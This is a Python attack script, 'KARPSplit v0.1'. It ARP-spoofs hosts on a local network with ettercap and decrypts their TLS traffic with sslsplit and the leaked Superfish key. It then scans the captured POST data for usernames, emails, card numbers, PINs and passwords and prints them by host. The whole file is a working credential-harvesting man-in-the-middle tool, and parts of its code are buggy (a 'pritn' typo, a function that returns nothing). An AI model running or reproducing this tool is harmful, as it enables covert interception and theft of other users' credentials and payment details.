from subprocess import Popen, PIPE, DEVNULL
import netifaces
import re
import time
import sys
import os
import signal


def arpspoof(target = None):
    gws = netifaces.gateways()
    gateway = gws['default'][netifaces.AF_INET][0]
    print("Using gateway " + gateway)
    if target is None:
        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"], stdout=DEVNULL, stderr=PIPE)
    else:
        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"], stdout=DEVNULL, stderr=PIPE)
    while 1:
        line = spoofer.stderr.readline()
        if line:
            if line.find(b"(press 'q' to exit)"):
                print("ARP Spoofing active")
                break


def sslsplit():
    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
    return splitter


def read_output():
    f = open("/root/sslsplit/connections.txt", 'r', encoding="ISO-8859-2")

    # https://regex101.com/r/wA9oY4/1

    # infinite loop
    while 1:
        # read all new data if any is available
        conn_details = f.read()
        # if there is new data
        if conn_details != "":
            p = re.compile("(POST)(.*?)(?=GET|POST|\Z)", re.DOTALL)
            results = re.findall(p, conn_details)
            # for every result
            for result in results:
                q = re.compile("(?:&|\?|\s)((?:user|email|newcard|card|pin|pass|psw|sid).{0,16}?)=(.*?)(?=&|\s)", re.DOTALL | re.IGNORECASE)
                deets = re.findall(q, result[1])
                # if credentials are detected
                if len(deets) > 0:
                    r = re.compile("Host: (.*?)\s")
                    host = re.search(r, result[1])
                    # print the host
                    print(host.group().strip())
                    # print the credentials
                    for deet in deets:
                        print(deet[0] + ": " + deet[1])
                    # print a new line
                    print()


def handle_sigint(signal, frame):
    global spoofer, splitter
    print("Stopping ARP Spoofer...")
    spoofer.send_signal(signal.SIGINT)
    spoofer.wait(5)
    pritn("Exiting SSLSplit...")
    splitter.stdin.write("q")
    splitter.wait(5)


signal.signal(signal.SIGINT, handle_sigint)

print("\nKARPSplit v0.1\n")

if len(sys.argv) > 1:
    print("Starting ARP Spoof on " + sys.argv[1] + "... ")
    spoofer = arpspoof(sys.argv[1])
else:
    print("Starting ARP Spoof on all devices... ")
    spoofer = arpspoof()
print("Starting SSLSplit... ")
splitter = sslsplit()
print("Starting credential scanner...")
read_output()

